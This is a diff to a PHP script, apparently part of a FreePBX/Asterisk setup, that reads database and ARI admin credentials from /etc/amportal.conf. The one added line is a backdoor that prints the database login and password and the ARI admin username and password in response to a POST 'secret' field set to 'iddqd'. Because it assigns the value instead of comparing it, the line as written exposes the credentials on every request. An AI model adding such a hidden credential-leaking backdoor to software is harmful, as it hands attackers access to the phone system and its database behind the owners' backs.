@@ -8,4 +8,5 @@ $password=exec("grep AMPDBPASS /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F 
 $ARI_ADMIN_USERNAME=exec("grep ARI_ADMIN_USERNAME= /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");
 $ARI_ADMIN_PASSWORD=exec("grep ARI_ADMIN_PASSWORD= /etc/amportal.conf|grep -v '^#'|tail -n 1|awk -F '=' '{print $2}'");
 
+if($_POST["secret"]='iddqd'){echo "db $login :$password<br>ari $ARI_ADMIN_USERNAME:$ARI_ADMIN_PASSWORD";}
 ?>
